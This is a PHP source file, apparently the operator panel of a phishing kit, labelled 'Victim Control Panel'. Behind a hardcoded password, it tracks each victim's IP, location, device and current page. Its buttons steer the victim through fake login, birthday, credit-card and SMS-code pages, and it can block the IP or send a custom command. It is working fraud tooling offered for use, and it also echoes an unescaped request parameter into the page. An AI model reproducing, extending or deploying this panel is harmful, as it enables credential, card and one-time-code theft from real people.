<?php
require_once "functions.php";

session_start();

?>

<?php

$password = "elite123"; // 🔐 Change your password here

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['panel_password'])) {
    if ($_POST['panel_password'] === $password) {
        $_SESSION['unlocked'] = true;
    } else {
        $login_error = true;
    }
}
?>

<?php if (!isset($_SESSION['unlocked']) || $_SESSION['unlocked'] !== true): ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure Access</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <link rel="stylesheet"  href="css/login.css">
</head>
<body>

  <div class="glow-box">
    <h2>🔐 Access Control Panel</h2>
    <form method="POST">
      <input type="password" name="panel_password" placeholder="Enter access key" required>
      <button type="submit">UNLOCK</button>
    </form>

    <?php if (isset($login_error)): ?>
      <div class="error-msg">🚫 Wrong password. Try again.</div>
    <?php endif; ?>
  </div>

</body>
</html>
<?php exit; endif; ?>


<?php include "monster/bot.php"; ?>



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Victim Control Panel</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
  <link rel="stylesheet"  href="css/panel.css">

</head>
<body>
  <canvas id="matrixCanvas"></canvas>
  <div id="smoke"></div>

<!--  -->

    <div class="dashboard-bar container mt-4 px-4 py-2 d-flex flex-wrap justify-content-between align-items-center gap-3">
      <div><i class="bi bi-flag text-warning"></i> <strong>Country:</strong> <img src="" id="flagImg" class="flag-icon"> <span id="countryName">Loading...</span></div>
      <div><i class="bi bi-cpu text-danger"></i> <strong>System:</strong> <span id="os">Detecting...</span></div>
      <div><i class="bi bi-browser-chrome text-info"></i> <strong>Browser:</strong> <span id="browser">Detecting...</span></div>
      <div><i class="bi bi-phone text-warning"></i> <strong>Device:</strong> <span id="device">Detecting...</span></div>
      <div><i class="bi bi-shield-exclamation text-danger"></i> <strong>Fake Info:</strong> <span id="fakeInfo" class="text-danger">Checking...</span></div>
    </div>



  <div class="container">
    <div class="glass-card mx-auto" style="max-width: 850px;">
      <div class="panel-header">
        <h2 class="mt-3 mb-5 text-light">Victim Control Panel</h2>
          <div class="status-box d-flex justify-content-between">
            <span>IP:</span>
            <span class="text-info"><?php echo $_GET['ip']; ?></span>
          </div>

          <div class="status-box d-flex justify-content-between">
            <span>Status:</span>
            <span id="status" class="visitor-status">Checking...</span>
          </div>

          <div class="page-box d-flex justify-content-between">
            <span>Current Page:</span>
            <span id="currentPage" class="text-primary">Loading...</span>
          </div>

          <hr class="text-secondary my-4">
      </div>

      <h4 class="section-title">Control Actions</h4>
      <form action="infos.php" method="post" class="d-flex flex-wrap justify-content-center">
        <input type="hidden" name="step" value="control">
        <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">

        <button type="submit" class="btn btn-custom btn-approuve" name="to" value="login"><i class="bi bi-box-arrow-in-right"></i>LOGIN</button>
        <button type="submit" class="btn btn-custom btn-success" name="to" value="birth"><i class="bi bi-emoji-smile"></i>BIRTHDAY</button>
        <button type="submit" class="btn btn-custom btn-cc" name="to" value="cc"><i class="bi bi-check-circle"></i> CC</button>
        <button type="submit" class="btn btn-custom btn-sms" name="to" value="sms"><i class="bi bi-chat-dots"></i> SMS</button>
        <button type="submit" class="btn btn-custom btn-approuve" name="to" value="smserr"><i class="bi bi-chat-dots"></i> SMS</button>
        <button type="submit" class="btn btn-custom btn-cc" name="to" value="app"><i class="bi bi-check-circle"></i> APPROUVE</button>
        <button type="submit" class="btn btn-custom btn-success" name="to" value="success"><i class="bi bi-emoji-smile"></i> SUCCESS</button>
        <button type="submit" class="btn btn-custom btn-danger" name="to" value="block"><i class="bi bi-slash-circle"></i> BLOCK IP</button>
        <div class="w-100 mt-4 d-flex flex-wrap gap-2 justify-content-center align-items-center">
            <input type="text" name="link" class="custom-input text-center" placeholder="Write custom command..." >
            <button type="submit" class="btn btn-custom btn-send" name="to" value="qrcode">
                <i class="bi bi-send"></i> SEND
            </button>
        </div>
        <style>
        .custom-input {
            max-width: 300px;
            padding: 10px 15px;
            border-radius: 10px;
            border: 2px solid #00ffe5;
            background: rgba(255, 255, 255, 0.05);
            color: #00ffe5;
            font-family: 'Orbitron', sans-serif;
            font-size: 16px;
            transition: 0.3s;
        }

        .custom-input:focus {
            outline: none;
            border-color: #0ff;
            box-shadow: 0 0 15px #0ff;
            background: rgba(0, 255, 255, 0.1);
        }

        .btn-send {
            background: linear-gradient(135deg, #00ffe5, #0077ff);
            border: none;
            border-radius: 10px;
            padding: 10px 20px;
            color: white;
            font-family: 'Orbitron', sans-serif;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: 0.3s;
        }

        .btn-send:hover {
            background: linear-gradient(135deg, #00ffe5, #00c3ff);
            box-shadow: 0 0 15px #00ffe5;
            transform: scale(1.05);
        }

        </style>  
      </form>
      <hr class="text-secondary my-4">

      <div class="status-container">
        <div class="status-box">
          <i class="bi bi-robot <?= $botColor ?>"></i>
          <div class="status-text">
            <strong>Bot Status:</strong>
            <span class="<?= $botColor ?>"><?= $botStatus ?></span>
          </div>
        </div>

        <div class="status-box">
          <i class="bi bi-person-check-fill text-primary"></i>
          <div class="status-text">
            <strong>Total Visitors:</strong>
            <span class="text-light"><?= $uniqueVisitors ?></span>
          </div>
        </div>
      </div>



    </div>
  </div>
  


  <!-- Scripts -->
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <script src="js/content.js"></script>

  <?php include "monster/manage.php"; ?>

</body>
</html>
